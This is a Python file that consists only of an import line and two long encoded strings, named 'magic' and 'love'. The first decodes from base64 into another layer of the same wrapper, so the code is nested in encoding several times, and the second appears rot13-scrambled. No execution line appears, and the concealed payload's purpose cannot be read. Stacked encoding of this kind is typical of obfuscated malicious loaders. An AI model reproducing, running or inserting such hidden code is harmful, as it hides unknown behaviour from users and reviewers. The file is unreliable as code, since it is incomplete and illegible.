import base64, codecs
magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzDQptYWdpYyA9ICdhVzF3YjNKMElHSmhjMlUyTkN3Z1kyOWtaV056RFFwdFlXZHBZeUE5SUNkaFZ6RjNZak5LTUVsSFNtaGpNbFV5VGtOM1oxa3lPV3RhVjA1NlJGRndkRmxYWkhCWmVVRTVTVU5rYUZaNlJqTlphazVMVFVWc1NGZHVUbHBYUlRWNVUxVk9ORTFIUmxoTlYzaEtVVE5vY2xkV2FGTmlSMUpJWWtoU1lWVXdSbkZaYTJSelpGWndWV0l6YUVWVldFSjBXVEl3TldSRmJFaFhiazVhVjBVMWVWTlZaSE5rUjA1SVQxaHNhMUV3U2pWWGJHUlRZMGRPZEZadGNHdFJNRVo2V1RJeFYyVkhVbGhXYm5CclVUQkdlbGRXWkV0a2JVNTFWVmRrU2sxdWFIZFpiVEZXVG1zeGJrMUZkR2hXZWtZeldXcE9TMDFGYkVobFNGcGhUVzFTZDFsdE1XcGFNSGhKVTIxNFNsRXdOWHBaVm1NeFlrVTVjVlJWTlVSaVZuQTFXV3BKZDFveVRuUlNha0poVmpOb2QxbHNaSE5OUld4SVlraFNhbEo2YkRWYVJVNURZekpHV0UxWVFtdFRSVEZ1VTFSS05HTkhTblJXVkZwUFVWUkNURmxXWTNoa01rbDZVMnBDU2xORlNURlpiR00xWkZadmVVOUhaRXBOYm1oM1dXMHhWazVyTlZKTlJYUlpUVlJzVVZSVlZUVlZSVEZGVVZoa1ZXVnJTbEZVVlZVMVZVVXhSazlXUWs1Uk1FVTFWVzB4UjJNeVRYbFdWMlJLVFc1b2QxbHRNVlpPYXpVelRVVjBhVmRIZUhGWmEyUnpZa2RLZFZWWFpGRlhSVWt4V1d4ak5XUldiM2xQUjJSTllYcEdNbGx0TVd0a2JFVjVaVWhDWVZaNlZYZFRWVTV1WVZkS1dFOVlWbUZOYW14eVYxZHdkbVJyZDNsbFNGcGFUV3RhZWxsVll6VmxiVkpGWWpOc1QyVnJSalJVYm1zMFlWVjBWRlJ1VG1oV2VsWnpWREp3Y2xSclRuUlZiV3hLVWtSR01GcFdaRTlqTWtaWVZtNVdhMUV3U21sVGFrSkhZVEZHZEU5VVFtcGxWMUpyVTFSS05HTkhTblJXVkZwT1ZrVkdUMUV5TlU5aGJVWllWVzV3U2xKRVJuSlhWMnhEV1d0c2MxUnJVbFJXVmtwVlUxZDNkMkZ0U2toaVNGWmhWa2M1TkZSV1JYZFRNV3gwVW01V2FXSldXbkpUVlZGNFlURnNjRkZ0U2t0TlIzaFNWVmN4TkdSc2EzbGtSM2hxWVZkU2ExTlVTalJqUjBwMFZsUmFUbFpGYkU5Uk1qRTBZMGRLV0dKRVFrcFNSRVp5VjFkc1ExbHJiM2xsU0VKcFZqSjNkMU5xUlhkaGJVcElZa2hXWVZaSE9UUlVXR04zVXpKS1NFOVhOVXBTUkVaNldXcEthMkp0UmxoT1Z6VktVWHBXZFZkc2FGTlVWMGw1V2tjMVlWZEZiRzVUTUU1clRURndXVk51U214aVZsbDRWMjVzYW1ORmEzbGxTRUpwWWxaVk1sUldVbFpVYTA1elYyMTRhbUpyTVc1VlJrNUxWREpKZUU5WVdtRmlWbkIzVjFSS1IyTXhaM2RTYlhScFZqSjRNVmRFUmxwbFJXeHdWRzVPYUZaNlZuTlVNbkJHVFd0U1VtTkhhR3BUUlVadVZVWmtZV014YkZsVWJrcEtVWHBXU0ZsclpFZGxiVVkxVVZjNVdVMVViREZYVm1ONFlrWm5lRTlIWkV4Vk1EVjZXVlpqTVdKRk9YRlNWRTVGVlZoQ2Ixa3dhRUphTUhoMFZXMTRXbUpzV25WVFZWRjRWbGRPZFZadGVFcFJNRFY2V1Zaak1XSkZPWEZTVkZKRlZWaENlbGxxU21wYU1IaDFWRzE0YTFKWWFITmFSekZYWXpCc1JHRklUbWxOYlZKMVdWWmpNV0pyYkVST1ZYQlZZVEZ3VVZOVlRuSmhiVXBJWWtoV1lWWkhPVFJVTVVWM1V6RndTRlp0TVVwU01Vb3lXa1prUzJNeGNGZFBWM0JvVWpGYWNWbFliRUppTVZJMlVWaGtUbEpGU2xGVVZWVTFWVVpTTmxGWVpGVk5SR3hSVkZWU1Fsb3dkRlZpTW5CcFVqSjRNVmRzVW5abFZURnVUVVYwU2xFd1JtNVRWV1J6WWxWc1NWTnRlRXBSZWxZd1YxWm9VMkZ0UmtSUlZ6bExaVlJTZUZaNlFrWmtSbVJ6VFVoV1RHRlhUbnBXU0hCQ1pEQXhSVkZzUWs1U1ZHeFJWa2h3UW1ReFVYZFBWa0pPVWtWR2JsTXhVblpoYlVwSVlraFdZVlpIT1RWVVdHTjNVekJzUkZGWFpFcFJNRVp1VTFWT1EyVldjRmxWYWtacVlsUlNibFpyYUV0TlZuQlVVVmR3YVZJeWVERlhiRkoyWlZVMVFrMUZkRXBSTUVadVUxVmtWMk15VFhsV1YyUlFZVlUxZWxsV1l6RmlSVGx4VTFSR1JWVlhPVzVUVlU1Q1dqQnNSRkZYWkVwVFJYQnpXa1ZvVjJWWFNuQlJhMlJhVmpOb05sZHNUa0poYlVwSVlraFdZVlpIT1RWVWJXTjNVekZ3U0ZadE1VcFNNRFYyVjJ4a1QyTnNaM3BVYlhocVlsZDRjMWt6YkVKaU1WRjNUMGhrVGxKVWJGRldSRUUxVlVaUmQwOVdRbFZsYTBwUlZGVlZORm93ZEZWaU1uQnBVako0TVZkc1VuWmxWVGxDVFVWMFNsRXdSbTVUVldoVFpWZFdWRkZVV2twTmJtaDNXVzB4Vms1ck1YRmhNRFZFWVZWR2JsTlZUa0phTUd4RVVWZGtZV0pVYkRWVFZWVTFWVVV4UlZGWVpFNVNWR2d6Vmtod1FtUXhValpSYkVKT1VsUm9NMU5WWkhOa1ZXeEpVMjFvYVdKWFVuTlRWVTV2WXpGd1dFNUhaRXhTVkd4UlZGVlNRMVZHVVhkUFZrSlZUVVJzVVZaRVFUUmtNVkkyVVd4Q1NsRXlkSGRVTW14UFl6SkdXRTVYZUZCaGF6RXpVa1pHZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXNUNZV0ZWU25kWmJUVlNXakIwUms5V1FrNVNSVXBSVmtSQk5WVkdVWGRQVmtKVlRVUm9NMVpJY0VOVlJXeEhaRVpDVldWclJqTlVWVkpEVlVVeFJrOUlaRTVTVkdnelZraHdRMVZGTVVSUmJWSk1aV3RXYmxSRlVrWk5hMnhFWVhwc1VWWXllREZhUlU1Q1lqRlJkMDlJWkU1U1ZHeFJWa1JCTlZWR1VYZFBWa0pWWld0S1VWUlZWVFJhTVdOM1QxWkNUbEpGUmpOVVZWVTBaREZTTmxGWVpGVmxhMHBSVkZWVk5HUXdiRVJqTTJoS1VtcENlbFJXVWxwYU1IUlZZakp3YVZJeWVERlhiRkoyWldzeFVrMUZkRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hKVTIxNGExTkdXalZaYld4RFZsZE9kVlp0ZUVwUk1EVjZXVlpqTVdKRk9YRlVXR3hGVlZjNWJsTlZUa0phTVhCWllVZHdZVmRGU1hkVFZWSjJZVzFLU0dKSVZtRldSemsyVkZoamQxTXdiRVJSVjJSS1VUQkdibE5WVGtObFZuQlpWV3BHYW1KVVVtNVZiVEZIWXpKTmVWWlhaRXBOYm1oM1dXMHhWazVyTVRaVlZUVkVZbFpLYzFkdGJFTmpSMDE0VDFoQ2FsSnFiSEJYVm1NeFpGWndXRlZYWkV4U1ZHZ3pWRlZTUTFWR1VqWlJiRUpPVWxSb00xUlZWVFJrTVZJMlVWaGtTbEV5ZERCVlJ6RkxaRzFKZVdReVpGQmhWVFY2V1Zaak1XSkZPWEZVVkVwRlZWYzVibE5WVGtKYU1rNTBWbXBDYTFkRmNERlRWV1JMWkcxSmVXUXlaRXhTTUhCdldXMHdNV0pHY0VSUldGWmhZbGQ0TVZkcldUVmtiVXAwVmxka1RGTklUbkJWTVZwQ1lWVTVjazlJWkU1U1JVcFJWa2h3UTFWRk1VWlBTR1JPVWxSb00xWkljRUprTUd4SlRVaENURlV3TlhwWlZtTXhZa1U1Y1ZSVVRrVlZXRUp5VjJ4a1dsb3lSbGxVYlZwclZqSjRjbGRFU2t0aFIwcDBUbGQ0WVZFd1JuWldTSEJDWkRGUmQwOVdRazVTUlVZelZraHdRMVZHVVhkUFNHUlZUVVJvYmxNeFRYZExNV3gwVDFoYWFWRXdSVEpUVkVvMFkwZEtkRlpVV2s1bGJYUlBVVEpzUWxvd2JFUlJibXhoVjBaSmVGa3lNREJhTVd4MFQxaGFhVkV3Um5aWFZ6RkhaRmRLZEZadGRFcFJlbFowV1Zaak1XRXhaM2xQV0ZaaFZUQkdkbHBZYkV0V2JFNVdWVmRzVUdGNmFETlVWVlUxVlVaU05sRllaRTVTVkdnelZrUkJOVlZGTVVaUFZrSktVMFJDZDFNeFRrOWpNa1pZVGxkNFVHRnNSak5TUmtaM1lURndXRmRYWkdoWFJUVnRXWHBLVDJOR2NFZFBWMnhhVm5wV01WZHNaRkphTUhSR1QwaGtUbEpVYUROVVZWSkRWVVV4Ums5V1FsVmxhMHBSVmtSQk5HUXdiRVJoZWxwS1RXNW9kMWx0TVZaT2F6VkZVMVUxUkdGVlJtNVRWVTVEWlZad1dWVnFSbXBpVkZKdVYxY3dOV1J0U2tSUlZ6bHFUV3MxZDFkcmFFNWFNSGgwVjI1Q2FXSldTbTFaYWtreFlrVnNSR0ZFWkVwaWF6VnhXVlprVW1GVk9YSlBTR1JPVWxSb00xUlZVa05WUlRGR1QxWkNWV1ZyU2xGV1JFRTBaREJzU1UxSVFreFZNRFY2V1Zaak1XSkZPWEZWV0hCRlZWaENjbGRzWkZwYU1XOTVWbXBDV1Uxck5YcFpWbVJYWkZkU1IwOVlRbXBSTUVaMlV6RlNkbUZ0U2toaVNGWmhWa2M0ZDFSc1JYZFRNR3hFVVZka1NsTkdTalZhVms1Q1RtdHJlV1ZJUW1saVZsVXlWR3RTV2xSclRuQlJWMlJLVVRCR2JsTlZUa0phTVZGM1QxWkNUbEpGUmpOVVZWSkRWVVpSZDA5SVpGVk5SR2d6VmtSQk5Gb3hRbGxUYlhocVYwWmFjMWw2VGxKYU1IaHlUVlZhVjFKVlZtNVdNMnhyVTFaYVIxVnNSbGxOVjJodFZXMXpOVlV4V1hkU2JFNVRVbFphUmxkRVFtRlZSbFp3V2tkU1NrMXVhSGRaYlRGV1RtczFSVmt3TlVSaFZVWnVVMVZPUWxvd2JFUlJWMlJWVFVSc1VWWkljRU5WUmxJMlVWaGtWVTFFYkZGV1NIQkRWVVV4Ums5SFpGRldWR3hSVmtod1FtUXdNVVZSV0dSVlRVUnNVVlJWVlRWVlJURkdUMVpDU2xGNlZqWlpNR1EwWTBkU1JGRlhPVXBoV0dSd1V6RmFlbVF3YkVkTlIzQnBVako0TVZkc1VuWk5SVGxDVFVWMFNsRXdSbTVUVldSWFRrWnJlVlp1Wkd0Uk1FVXlVMVJLTkdOSFNuUldWRnBQVWtkMFQxRXliRUphTUd4RVVWZGtTbEV3Um01YVJXaExUbFZzUldJeWNHbFNNbmd4VjJ4U2RrMVZNVUpOUlhSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVdSRUUxVlVaU05sRnNRbFZsYTBZelZrUkJOVlZHVWpaUmJFSk9VbFJvYmxWR2FFdGlSMDVaVm0xNGFrMHhSbTVVUjNONFVteGFSbEpYWkZobFYxSlVWV3hWZUZWR1drWldiVnBTVmxaS1JsWlhiR3RhUld0NVpVaENhV0pXVlRKVWJGSkdWR3RPY0ZGWFpFcFJNRVp1VTFWT1Fsb3hjRmxoUjNCaFYwVkpkMU5WVW5aaGJVcElZa2hXWVZaSE9IaFVWMk4zVXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUlZUVVJzVVZaSWNFTlZSbEkyVVZoa1ZVMUViRkZXU0hCRFZVVXhSazlIWkZGWFJYQnpXVEZvVjJKSFRYcFZWMlJOWW10d2MxbHNZelZOUm5CWFQxZG9ZVkl4U2pWVFZVNVBZekpHV0U1WGVGQmhiRlkyVWtaR2Rsb3diRVJSVjJScVlsWlpkMXBHYUV0a1ZXeEdUMVpDVlUxRWFETldSRUUwWkRBeFJrOVdRbFZOUkdnelZraHdRMVZGYkVSVWJrNW9WbnBXYzFReWNGWk5SVkpTWTBkMFlWWXhiRzVaTWpCNFdteHNkR1ZIYUZwTmJrNXVVekJWTlZWR1VYZFBWa0pWVFVSb00xWkVRVFZWUmxJMlVWaGtWV1ZyU2xGVFZVNXlUbXRyZVdWSVFtbGlWbFV5Vkd4U2JsUnJUbkJSVjJSS1VUQktkMWR0YkVOalIwMTRUMWhDYWxKcWJIQlhWbU14WkZad1dGVlhaRXhTVkd4UlZrUkJOVlZHVVhkUFNHUlZUVVJzVVZaSWNFSmtNVkkyVVd4Q1NsRXljekpUVkVvMFkwZEtkRlpVV2s5V1IzUlBVVEpzUWxvd2JFUlJWMlJLVVRCR2JsZFhNVWRrVjBwMFZtMTBTbEY2Vm5KWGJHUTBZa2RTU0ZadFdtbE5hbFp6VTFWT2IwNHdiSEppUmtaS1lXNUNVVlpFUVRWVlJsRjNUMVpDVGxKVWJGRldSRUUwWkRBeFJrOUlaRlZsVlVrMVV6Rk9UMk15UmxoT1YzaFFZV3hzTTFKR1JuWmFNR3hFVVZka1NsRXdSbTVUVldoTFlrZFNTVlp1YkdsaFZVcFdXVEkxVjJKRmJFUlViazVvVm5wV2MxUXljRnBsUlZKU1lqSmtTbEV3Um01WGJHUTBZMFp3Y0ZGdVFtcE5WR3Q0V1Zaa1UxcHNiSFJTYmxacFlsWmFjbE5WVG05VlJsRjNUMVpDVlUxRWJGRlVWVlUxVlVaUmQwOUlaRTVTVkdnelZraHNRbU5GT1hCVWJrNW9WbnBXYzFReWNGcGxWVkpTWWpKa1NsRXdSbTVUVlU1Q1dqQnNTRk50YUdsaVZGWnpWMnRPUW1SV2NFaFdiazVoVjBaS2MxZEVTVFZrVm5CVVVWYzViR1ZWY0ZkVk1WWlNZVlU0YmtSUmNITmlNMXBzU1VRd1owb3paelZSTUdOM1QxVk9TRTFFYUhGU2VrRTFVVEJrZEZSdGNFaGlWVGxFVm14VmQxa3hXWGxoTWs1MlpXdG5NbEZZWkdGUlZrSXlWRzVTVjFWRk5UQldiRUpQWkVoQ05sTlVRbmhUTVdSdlZteE9SbUpJUmt0VFNGSlhUVzEwYW1JemNFa25EUXBzYjNabElEMGdKMEY0VXpORlVsTkVjWGcxTUVsNVQwTnlTamxJY2t0alNrbFZlV2RHYlVGUGNUSTFXRVZMUVZweWVVRmliek5qVjNKVFRVUnhTRUZWV2xGNVVVVnRUalZFTVdOR1FraEJWVnBSJw0KbG92ZSA9ICdxSkVYcklMMG9hdWtNeHE2RElPa3JTQTZvM3V2WktXVkltQVVISUFTRUlFS1pSeTVHMFdrSDAxUkUyU1NGeHlWSG1BaXJUQUdvM'
love = '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'